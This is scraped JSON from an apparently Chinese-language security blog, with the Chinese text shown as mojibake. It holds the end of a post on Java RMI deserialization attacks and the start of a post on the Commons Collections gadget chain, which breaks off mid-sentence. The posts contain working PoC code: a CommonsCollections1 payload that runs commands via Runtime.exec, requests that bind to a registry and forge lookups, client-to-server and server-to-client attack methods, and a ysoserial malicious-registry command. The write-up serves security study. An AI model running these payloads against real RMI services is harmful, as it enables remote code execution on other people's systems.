RegistryImpl_Skel#dispatchï¼Œè¯¥æ–¹æ³•åŒ…æ‹¬å¤„ç†è¯·æ±‚çš„æ ¸å¿ƒé€»è¾‘ï¼š\nswitch è¯­å¥çš„å‚æ•° var3 å°±æ˜¯ server ç«¯ä¼ è¿‡æ¥çš„ opnumï¼Œå¯¹åº”çš„æ“ä½œåœ¨ä¹‹å‰çš„æˆªå›¾ä¸­ã€‚\nå¯ä»¥çœ‹åˆ° bind å’Œ rebind éƒ½æœ‰ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œlookup å’Œ unbind ä¹Ÿå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†ç”±äºå‚æ•°æ˜¯ String ç±»å‹ï¼Œå¹¶ä¸èƒ½ç›´æ¥åˆ©ç”¨ã€‚\nä¸Šå›¾çš„ var6 æ˜¯ RegistryImpl å¯¹è±¡ï¼Œå› æ­¤æœ€ç»ˆè¿˜æ˜¯ä¼šæ‰§è¡Œ RegistryImpl#bind æ–¹æ³•ã€‚\nå›åˆ° server ç«¯ï¼Œå³ RegistryImpl_Stub#bind æ–¹æ³•ä¸­ï¼Œå‘è¾“å‡ºæµå†™å…¥åºåˆ—åŒ–åçš„è¿œç¨‹å¯¹è±¡å’Œå®ƒçš„åç§°ã€‚æ‰§è¡Œ super.ref.invoke() å‘é€è¯·æ±‚ç»™ registryï¼Œç”± RegistryImpl_Skel#dispatch å¤„ç†è¯·æ±‚ã€‚\nClient client ç«¯å’Œ server ç«¯çš„é€šä¿¡å‘ç”Ÿåœ¨è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œåœ¨æ­¤ä¹‹å‰éœ€è¦é€šè¿‡ RegistryImpl_Stub#lookup ä»æ³¨å†Œä¸­å¿ƒè·å–å°è£…å¥½çš„ä»£ç†å¯¹è±¡ã€‚\nè°ƒç”¨è¿œç¨‹å¯¹è±¡çš„ä»»æ„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ RemoteObjectInvocationHandler#invokeï¼š\nä¸Šå›¾åˆ¤æ–­è°ƒç”¨çš„æ–¹æ³•æ˜¯ä¸æ˜¯æ‰€æœ‰å¯¹è±¡å…±æœ‰çš„ï¼Œå¦‚æœä¸æ˜¯å°±æ‰§è¡Œ invokeRemoteMethodã€‚\næ¥ç€è°ƒç”¨ LiveRef#invoke æ–¹æ³•(ç”± lookup è·å–)ï¼ŒæŠŠ proxyã€methodã€args ä»¥åŠ method çš„ hash ä¼ è¿‡å»ï¼š\nè·Ÿè¿› LiveRef#invokeï¼š\nè·å–åˆ° Connection å¯¹è±¡åï¼Œè°ƒç”¨ marshaValue å°†è¿œç¨‹æ–¹æ³•çš„å‚æ•°åºåˆ—åŒ–å†™å…¥åˆ°è¿æ¥ä¸­ï¼š\næ¥ç€å°†è¾“å‡ºæµçš„æ•°æ®å‘é€åˆ° server ç«¯ï¼Œè·å–å“åº”åè°ƒç”¨ unmarsharValue è¿›è¡Œååºåˆ—åŒ–ï¼š\nåœ¨ server ç«¯è´Ÿè´£å¤„ç†è¯·æ±‚çš„æ–¹æ³•æ˜¯ UnicastServerRef#dispatchï¼Œè°ƒç”¨ unmarshaValue å¯¹å‚æ•°è¿›è¡Œå¤„ç†ï¼š\nå¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨ unmarshaValue ä¸­ä¼šå°†å…¶ååºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡åå°„è°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚\nåé¢çš„æµç¨‹å°±ä¸ç»§ç»­è·Ÿè¿›äº†ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ client ç«¯å’Œ server ç«¯é€šä¿¡æ—¶è°ƒç”¨äº† unmarshaValue æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ç›¸å…³æ“ä½œï¼Œè¿™ä¹Ÿæ­£æ˜¯æ”»å‡»çš„å…¥å£ç‚¹ã€‚\næ”»å‡»é€”å¾„ å‰æ–‡å¤§è‡´åˆ†æäº†ä¸€ä¸‹ Java RMI ä¸­å„ä¸ªè§’è‰²æ˜¯æ€ä¹ˆè¿›è¡Œäº¤äº’çš„ï¼Œä»¥åŠä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸€äº›æ¶‰åŠåˆ°ååºåˆ—åŒ–çš„ç‚¹ã€‚ä¸‹é¢å°±é’ˆå¯¹è¿™äº›ååºåˆ—åŒ–çš„ç‚¹è¿›è¡Œæ¨¡æ‹Ÿæ”»å‡»ï¼Œä»¥æ­¤äº†è§£é’ˆå¯¹ Java RMI æœåŠ¡éƒ½æœ‰å“ªäº›å¸¸è§çš„æ”»å‡»é€”å¾„ã€‚\næ”»å‡»æ—¶æ‰€ä½¿ç”¨çš„ POP é“¾æ˜¯ CommonsCollections1ï¼Œå¯ä»¥åœ¨è¿™ç¯‡æ–‡ç« äº†è§£ä¸€ä¸‹ã€‚å…ˆå†™ä¸€ä¸ª Poc ç±»æ–¹ä¾¿ç”Ÿæˆæ¶æ„å¯¹è±¡ï¼š\npublic class Poc { Remote getObject() throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] {String.class, Class[].class}, new Object[] {\u0026quot;getRuntime\u0026quot;, new Class[0]}), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] {String.class}, new Object[] {\u0026quot;calc.exe\u0026quot;}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026quot;value\u0026quot;, \u0026quot;zrquan\u0026quot;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\u0026quot;sun.reflect.annotation.AnnotationInvocationHandler\u0026quot;); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); // ç”¨Remoteä»£ç†å¯¹è±¡å°è£…evalObject return Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject)); } } ç”±äº RMI å¾ˆå¤šæ–¹æ³•çš„å‚æ•°éƒ½æ˜¯ Remote ç±»å‹ï¼Œæ‰€ä»¥è¦ç”¨ Remote ç±»å‹çš„ä»£ç†å¯¹è±¡å°è£… evalObjectï¼Œå½“ä»£ç†å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼ŒevalObject ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–ã€‚\nServer/Client \u0026ndash;\u0026gt; Registry å…ˆçœ‹çœ‹ registry ä¸­æœ€å®¹æ˜“åˆ©ç”¨çš„ä¸¤ä¸ªæ–¹æ³• bind å’Œ rebindï¼Œå®ƒä»¬ä¼šå¯¹æ¥æ”¶åˆ°çš„åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼š\né€šè¿‡ Poc#getObject ç”Ÿæˆæ¶æ„å¯¹è±¡ï¼Œè°ƒç”¨ bind æ–¹æ³•(rebind ç±»åŒ)ä¼ ç»™ registryã€‚\nRegistry registry = LocateRegistry.getRegistry(3333); registry.bind(\u0026quot;User\u0026quot;, (new Poc()).getObject()); RegistryImpl_Skel#dispatch å¤„ç†è¯·æ±‚ï¼š\nååºåˆ—åŒ– AnnotationInvocationHandler å¯¹è±¡ï¼Œè°ƒç”¨ var5.setValue() æ–¹æ³•ï¼š\nè°ƒç”¨ ChainedTransformer#transformï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\næ¥ä¸‹æ¥å°è¯•åˆ©ç”¨ lookup æ–¹æ³•(unbind ç±»åŒ)ï¼Œå®ƒæ¥æ”¶çš„æ˜¯ String å‚æ•°ï¼Œä¸èƒ½ç›´æ¥ä¼ é€’æ¶æ„å¯¹è±¡ã€‚\nä½†å‰é¢çš„åˆ†æè¿‡ç¨‹æˆ‘ä»¬å·²ç»çŸ¥é“ï¼ŒRegistryImpl_Skel#dispatch æ˜¯é€šè¿‡ä¸€ä¸ªæ•°å­—æ¥åˆ¤æ–­æ‰§è¡Œä»€ä¹ˆæ“ä½œçš„ï¼Œæ‰€ä»¥å®ƒå¹¶ä¸èƒ½åˆ¤æ–­æˆ‘ä»¬ä¼ è¿‡å»çš„æ˜¯ä¸æ˜¯ String å¯¹è±¡ï¼Œé‚£æˆ‘ä»¬ä»¿ç…§ lookup æ–¹æ³•çš„é€»è¾‘æ¥å‘é€æ¶æ„å¯¹è±¡ä¸å°±å¥½äº†ã€‚\nçœ‹ä¸€ä¸‹ RegistryImpl_Stub#lookup æ–¹æ³•çš„å…³é”®æ“ä½œï¼š\né€šè¿‡ä»¥ä¸‹ä»£ç ä¼ªé€  lookup è¯·æ±‚ï¼š\nRegistry registry = LocateRegistry.getRegistry(3333); // è·å–super.ref Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(registry); // è·å–operations Field[] fields_1 = registry.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry); // æ¨¡ä»¿lookupæ–¹æ³• RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(Poc.getObject()); ref.invoke(var2); æ­¤å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ RASP æŠ€æœ¯ hook è¯·æ±‚ä»£ç ï¼Œä¿®æ”¹å‘é€çš„æ•°æ®ã€‚\nRegistry \u0026ndash;\u0026gt; Server/Client è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒåï¼Œæ˜¯é€šè¿‡ RegistryImpl_Stub å¯¹è±¡æ¥è¿›è¡Œæ“ä½œçš„ã€‚æˆ‘ä»¬å‰é¢åˆ†æè¿‡ RegistryImpl_Stub#bind æ–¹æ³•ï¼ŒåŒæ–¹ä¼šç›¸äº’ä¼ è¾“åºåˆ—åŒ–çš„æ•°æ®ï¼Œè‡ªç„¶ä¼´éšç€ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæ³¨å†Œä¸­å¿ƒä¹Ÿå°±å¯ä»¥è¿”å›æ¶æ„æ•°æ®å®Œæˆå¯¹ client æˆ– server ç«¯çš„æ”»å‡»ã€‚\nå¯ä»¥ç”¨ ysoserial æ­å»ºæ¶æ„çš„ registryï¼Œæˆ‘ç”¨é«˜ç‰ˆæœ¬ jdk æ—¶ä¼šæŠ¥é”™ï¼Œç”¨ jdk8 å°±å¯ä»¥è¿è¡Œã€‚\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 12321 CommonsCollections1 'calc.exe' åœ¨æ¶æ„ registry æ‰§è¡Œ list æ–¹æ³•åï¼Œå®¢æˆ·ç«¯çš„è°ƒç”¨æ ˆï¼š\nçœ‹åˆ° StreamRemoteCall#executeCall æ–¹æ³•ä¸­æœ‰ååºåˆ—åŒ–æ“ä½œï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š\nå®¢æˆ·ç«¯åœ¨ switch è¯­å¥ä¸­å¯¹è¾“å…¥æµè¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¼šè¢«æ¶æ„ registry æ”»å‡»ã€‚å…¶å®åœ¨æ‰§è¡Œ bindã€unbind è¿™äº› void æ–¹æ³•æ—¶ï¼Œæ­£å¸¸æƒ…å†µæ˜¯èµ°åˆ° case 1 é‡Œç›´æ¥è¿”å›çš„ï¼Œä¸è¿‡ var1 ä¹Ÿæ˜¯ä»è¾“å…¥æµè¯»å–çš„ï¼Œæ‰€ä»¥æ¶æ„ registry å®Œå…¨å¯ä»¥æ§åˆ¶ switch çš„èµ°å‘ã€‚\nå…¶ä½™çš„ lookupã€bindã€rebindã€unbind æ–¹æ³•åŒæ ·å¯ä»¥è¢«æ¶æ„ registry æ”»å‡»ã€‚\nServer \u0026ndash;\u0026gt; Client å½“è¿œç¨‹æ–¹æ³•çš„è¿”å›å€¼æ˜¯å¯¹è±¡æ—¶ï¼Œserver ç«¯å¯ä»¥é€šè¿‡è¿”å›ä¸€ä¸ªæ¶æ„å¯¹è±¡å¯¹ client ç«¯è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚\nç°åœ¨ç»™ User æ¥å£æ·»åŠ ä¸€ä¸ª attackClient æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å› Object å¯¹è±¡ï¼š\npublic Object attackClient() throws RemoteException try { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] {String.class, Class[].class}, new Object[] {\u0026quot;getRuntime\u0026quot;, new Class[0]}), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] {String.class}, new Object[] {\u0026quot;calc.exe\u0026quot;}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026quot;value\u0026quot;, \u0026quot;zrquan\u0026quot;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\u0026quot;sun.reflect.annotation.AnnotationInvocationHandler\u0026quot;); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); return (Object) evalObject; } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } return null; æ³¨å†Œå¥½è¿œç¨‹å¯¹è±¡åï¼Œåœ¨ client ç«¯è°ƒç”¨ attackClient æ–¹æ³•æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nåœ¨ UnicastRef#unmarshalValue æ–¹æ³•ä¸­è§¦å‘ååºåˆ—åŒ–ï¼ŒæˆåŠŸåœ¨ client ç«¯æ‰§è¡Œå‘½ä»¤ã€‚\nClient \u0026ndash;\u0026gt; Server ç›¸åº”çš„ï¼Œå½“è¿œç¨‹æ–¹æ³•çš„å‚æ•°æ˜¯å¯¹è±¡æ—¶ï¼Œclient ç«¯ä¹Ÿå¯ä»¥é€šè¿‡è¾“å…¥ä¸€ä¸ªæ¶æ„å¯¹è±¡å¯¹ server ç«¯è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚\nå†ç»™ User æ¥å£æ·»åŠ ä¸€ä¸ª attackServer æ–¹æ³•ï¼Œå®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ª Object å¯¹è±¡ï¼š\npublic void attackServer(Object obj) throws RemoteException { System.out.println(obj); } ä¸ºäº†æ–¹ä¾¿èµ·è§(æ‡’)ï¼Œç›´æ¥ç”¨åˆšåˆšçš„ attackClient æ¥ç”Ÿæˆæ¶æ„å¯¹è±¡ã€‚client ç«¯çš„ä»£ç å¦‚ä¸‹ï¼š\npublic class UserClient { public static void main(String[] args) throws Exception{ Registry reigstry = LocateRegistry.getRegistry(3333); Object evilObj = (new UserImpl()).attackClient(); User user = (User) reigstry.lookup(\u0026quot;User\u0026quot;); user.attackServer(evilObj); } } ä»£ç æ‰§è¡Œåï¼Œçœ‹ä¸€ä¸‹ server çº¿ç¨‹çš„è°ƒç”¨æ ˆï¼š\nUnicastServerRef#dispatch è´Ÿè´£å¤„ç† client ç«¯çš„è¯·æ±‚ï¼ŒåŒæ ·æ˜¯åœ¨ UnicastRef#unmarshalValue æ–¹æ³•ä¸­è§¦å‘ååºåˆ—åŒ–ã€‚\næœ€å æœ¬æ–‡ä»‹ç»äº† Java RMI ä¸­çš„ä¸‰ä¸ªè§’è‰²â€”â€”æ³¨å†Œä¸­å¿ƒã€æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ã€‚ç®€å•åœ°åˆ†æäº†å®ƒä»¬åœ¨è¿›è¡Œäº¤äº’æ—¶ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¼„æ¸…æ¥šååºåˆ—åŒ–ä¼šåœ¨ä»€ä¹ˆæ—¶å€™å‘ç”Ÿï¼Œä»è€Œå­¦ä¹ å¦‚ä½•å»è¿›è¡Œæ”»å‡»ã€‚\nä½†å®é™…ä¸Šï¼Œåœ¨ JDK9 ä¸­å¼•å…¥äº† JEP 290 åï¼Œå¯¹ RMI çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸å†åƒæœ¬æ–‡é‚£ä¹ˆç®€å•ç›´æ¥ã€‚å…³äº JEP 290 çš„çŸ¥è¯†ä¼šåœ¨ä¹‹åçš„æ–‡ç« ä¸­åˆ†äº«ã€‚\n","date":"2021-03-08","permalink":"https://zrquan.github.io/posts/java-rmi/","tags":["java"],"title":"Java RMI"},{"content":"Commons Collections Java Collections Framework æ˜¯ JDK1.2 ä¸­æ·»åŠ çš„ç±»åº“ï¼Œæä¾›äº†å¾ˆå¤šé›†åˆç›¸å…³çš„æ•°æ®ç»“æ„ã€æ¥å£ã€ç®—æ³•ç­‰ï¼Œå¹¶æˆä¸ºäº† Java ä¸­å…¬è®¤çš„é›†åˆå¤„ç†æ ‡å‡†ã€‚\nCommons Collections åˆ™æ˜¯ Apache å¼€å‘çš„ç¬¬ä¸‰æ–¹åº“ï¼Œæ‰©å±•äº† Java æ ‡å‡†é›†åˆåº“çš„åŠŸèƒ½ç‰¹æ€§ã€‚å…¶ä¸­ä¸€ä¸ªé‡è¦çš„ç‰¹æ€§æ˜¯ï¼š\nTransforming decorators that alter each object as it is added to the collection Commons Collections å®ç°äº†ä¸€ä¸ª TransformedMap ç±»ï¼Œè¯¥ç±»æ˜¯å¯¹ Java æ ‡å‡†æ•°æ®ç»“æ„ Map æ¥å£çš„æ‰©å±•ã€‚è¯¥ç±»å¯ä»¥åœ¨ä¸€ä¸ªå…ƒç´ è¢«åŠ å…¥åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œå…·ä½“çš„å˜æ¢é€»è¾‘ç”± Transformer ç±»å®šä¹‰ï¼ŒTransformer åœ¨ TransformedMap å®ä¾‹åŒ–æ—¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚\norg.apache.commons.collections.Transformer è¿™ä¸ªç±»å¯ä»¥æ»¡è¶³å›ºå®šçš„ç±»å‹è½¬åŒ–éœ€æ±‚ï¼Œå…¶è½¬åŒ–å‡½æ•°å¯ä»¥è‡ªå®šä¹‰å®ç°ï¼Œæ¼æ´è§¦å‘å‡½æ•°å°±æ˜¯åœ¨äºè¿™ä¸ªç‚¹ã€‚1\nPOC é¦–å…ˆçœ‹ä¸€ä¸‹ CommonsCollections1#getObject æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨æ¥æ„é€ æ¶æ„å¯¹è±¡ï¼š\npublic InvocationHandler getObject(final String command) throws Exception { final String[] execArgs = new String[] { command }; // åˆå§‹åŒ–ChainedTransformer final Transformer transformerChain = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1) }); // Transformeræ•°ç»„ï¼Œæ„æˆæ¶æ„ä»£ç çš„å…³é”® final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] { String.class, Class[].class }, new Object[] { \u0026quot;getRuntime\u0026quot;, new Class[0] }), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; final Map innerMap = new HashMap(); // ç”¨äºè§¦å‘transformersçš„è½¬åŒ–é€»è¾‘ final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); Reflections.setFieldValue(transformerChain, \u0026quot;iTransformers\u0026quot;, transformers); return handler; } ä¸Šé¢çš„ä»£ç ä¸­ï¼Œåˆ©ç”¨åˆ°çš„å’Œ transformer ç‰¹æ€§ç›¸å…³çš„ç±»æœ‰ 3 ä¸ªï¼š\nInvokerTransformerï¼šé€šè¿‡åå°„æœºåˆ¶å®ç°è½¬åŒ–ï¼Œè¿”å›æ–°å®ä¾‹ã€‚ ConstantTransformerï¼šå°†è¾“å…¥çš„å¸¸é‡åŸå°ä¸åŠ¨åœ°è¿”å›ã€‚ ChainedTransformerï¼šå…¶ iTransformers å±æ€§æ˜¯ä¸€ä¸ª transformer æ•°ç»„ï¼Œå¯ä»¥ä¾æ¬¡æ‰§è¡Œæ¯ä¸ªå…ƒç´ çš„ transform æ–¹æ³•ï¼Œä¸”å‰ä¸€æ–¹æ³•çš„è¿”å›å€¼ä¼šä½œä¸ºåä¸€æ–¹æ³•çš„è¾“å…¥ã€‚ æˆ‘ä»¬éœ€è¦ç”¨åˆ° InvokerTransformer#transform ä¸­çš„åå°„æœºåˆ¶æ¥æ‰§è¡Œä»£ç ï¼Œè¯¥æ–¹æ³•çš„å…³é”®é€»è¾‘å¦‚ä¸‹ï¼š\nClass cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); input æ˜¯è°ƒç”¨æ–¹æ³•æ—¶çš„å‚æ•°ï¼Œè€Œ iMethodNameã€iParamTypesã€iArgs å±æ€§å—æˆ‘ä»¬æ§åˆ¶ã€‚ä¸éš¾çœ‹å‡ºï¼Œå¦‚æœæƒ³è¦è°ƒç”¨ Runtime#exec æ¥æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š\ninput æ˜¯ Runtime ç±»çš„å®ä¾‹ this.iMethodName = \u0026ldquo;exec\u0026rdquo; this.iParamTypes = String.class this.iArgs = command æ»¡è¶³åä¸‰ç‚¹å¹¶æ²¡æœ‰éš¾åº¦ï¼Œå› ä¸ºè¿™ä¸‰ä¸ªå±æ€§å€¼éƒ½å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œå®Œå…¨ç”±æˆ‘ä»¬æ§åˆ¶ã€‚ä½†æ­£å¸¸æƒ…å†µä¸‹ï¼Œç›®æ ‡ä¸å¯èƒ½ç”¨ Runtime å®ä¾‹ä½œä¸ºå‚æ•°ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ§åˆ¶ input çš„å€¼ã€‚\nå¦å¤–è¦çŸ¥é“çš„æ˜¯ï¼ŒRuntime ç±»ä½¿ç”¨äº†å•ä¾‹æ¨¡å¼ï¼Œæ‰€ä»¥å®ƒçš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œä¸èƒ½é€šè¿‡ new æ¥è·å–å®ä¾‹ï¼Œåªèƒ½é€šè¿‡ Runtime#getRuntime æ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è§£å†³çš„å…³é”®é—®é¢˜æ˜¯ä½¿ input ç­‰æ•ˆäºï¼š\nClass.forName(\u0026quot;java.lang.Runtime\u0026quot;).getMethod(\u0026quot;getRuntime\u0026quot;).invoke(Class.forName(\u0026quot;java.lang.Runtime\u0026quot;)) ChainedTransformer æƒ³è¦æ§åˆ¶ input çš„å€¼ï¼Œéœ€è¦åˆ©ç”¨ ChainedTransformer ç±»ï¼Œå…¶å…³é”®çš„ transform æ–¹æ³•å¦‚ä¸‹ï¼š\npublic Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } this.iTransformers å±æ€§æ˜¯ä¸€ä¸ª transformer æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å±æ€§å¤šæ¬¡æ‰§è¡Œ InvokerTransformer#transform æ–¹æ³•ã€‚ç”±äºæ‰§è¡Œæ–¹æ³•çš„è¿”å›å€¼ä¼šä½œä¸ºä¸‹ä¸€æ¬¡æ‰§è¡Œçš„è¾“å…¥ï¼Œè€Œè¿™ä¸ªè¿”å›å€¼æˆ‘ä»¬æ˜¯å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šæ§åˆ¶çš„ï¼Œä»¥æ­¤æ¥è¾¾åˆ°æ§åˆ¶ input å€¼çš„ç›®çš„ã€‚\næ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬ç°åœ¨å°†ç›®çš„å·§å¦™åœ°è½¬æ¢æˆä½¿è¿”å›å€¼ï¼š\nmethod.invoke(input, this.iArgs); ç­‰æ•ˆäºæˆ‘ä»¬æƒ³è¦çš„ input å€¼ï¼š\nClass.forName(\u0026quot;java.lang.Runtime\u0026quot;).getMethod(\u0026quot;getRuntime\u0026quot;).invoke(Class.forName(\u0026quot;java.lang.Runtime\u0026quot;)) å›é¡¾ä¸€ä¸‹ InvokerTransformer#transformï¼š\nClass cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); ç°åœ¨æ˜¯ä¸æ˜¯è§‰å¾—ï¼Œåªè¦è®© cls å˜é‡ç­‰äº Runtime.class å°±å¤§åŠŸå‘Šæˆäº†å‘¢ã€‚ä½†ä»”ç»†ä¸€æƒ³ï¼Œè¿™ä¸å°±å›åˆ°å¼€å¤´è¯´çš„è¦ input ä¸º Runtime ç±»çš„å®ä¾‹å—ğŸ˜µ\næ—¢ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ ChainedTransformer#transform æ§åˆ¶ input å€¼ï¼Œé‚£æƒ³åŠæ³•åœ¨å‰é¢çš„å¾ªç¯ä¸­ä½¿è¿”å›å€¼æ˜¯ Runtime ç±»çš„å®ä¾‹ä¸å°±å¥½äº†ï¼Ÿæ¯”å¦‚åˆ©ç”¨å‰é¢æåˆ°çš„ ConstantTransformer ç±»ï¼š\nåªè¦åœ¨ transformer æ•°ç»„æ·»åŠ å…ƒç´  new ConstantTransformer(Runtime.getRuntime()) ï¼Œä¸‹ä¸€æ¬¡å¾ªç¯çš„è¾“å…¥å°±æ˜¯ Runtime å®ä¾‹ã€‚\nç„¶è€Œ Runtime ç±»æ²¡æœ‰å®ç° Serializable æ¥å£ï¼š\nåå°„ æˆ‘ä»¬æ²¡æœ‰åŠæ³•è®© Runtime å¯¹è±¡åºåˆ—åŒ–ï¼Œä½†å¯ä»¥åºåˆ—åŒ– Runtime.class ï¼Œä¹Ÿå°±æ˜¯ java.lang.Class çš„å¯¹è±¡ã€‚å‡è®¾å°† input çš„å€¼è®¾ä¸º Runtime.class ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„è¯­å¥å¾—åˆ° Runtime#getRuntimeï¼š\nClass cls = input.getClass(); // cls == java.lang.Class Method method = cls.getMethod(\u0026quot;getMethod\u0026quot;, paramTypes); return method.invoke(input, new Object[] {\u0026quot;getRuntime\u0026quot;, new Class[0] }); ç°åœ¨æˆ‘ä»¬å¾—åˆ°äº† Runtime#getRuntime çš„ Method å¯¹è±¡ï¼Œå†é€šè¿‡ä»¥ä¸‹è¯­å¥æ‰§è¡Œè¿™ä¸ªæ–¹æ³•ï¼š\nClass cls = input.getClass(); // input == Method(getRuntime) Method method = cls.getMethod(\u0026quot;invoke\u0026quot;, paramTypes); return method.invoke(input, args); è¿™é‡Œå·§å¦™åœ°åˆ©ç”¨ invoke æ–¹æ³•æ¥æ‰§è¡Œ invoke æ–¹æ³•ï¼Œç›®çš„æ˜¯å°† invoke çš„æ‰§è¡Œå¯¹è±¡å’Œå‚æ•°è½¬åŒ–æˆæˆ‘ä»¬èƒ½æ§åˆ¶çš„ input å’Œ args å˜é‡ã€‚\næˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ ysoserial çš„ pocï¼Œä»¥ä¾¿äºç†è§£ã€‚å…³é”®çš„ transformer æ•°ç»„å¦‚ä¸‹ï¼š\nfinal Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] { String.class, Class[].class }, new Object[] { \u0026quot;getRuntime\u0026quot;, new Class[0] }), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; é¦–å…ˆæ˜¯ ConstantTransformer#transform æ–¹æ³•ï¼Œè¿”å› Runtime.class ï¼š\nç¬¬ä¸€æ¬¡è°ƒç”¨ InvokerTransformer#transformï¼Œè·å– Runtime#getRuntime çš„ Method å¯¹è±¡ï¼š\nç¬¬äºŒæ¬¡è°ƒç”¨ InvokerTransformer#transformï¼Œè¿”å› Runtime å¯¹è±¡ï¼š\nä¸Šå›¾è¿˜æ³¨æ„åˆ°äº† this.iArgs ç¬¬ä¸€ä¸ªå€¼æ˜¯ nullï¼Œè¿™å¯¹åº”ç€ invoke 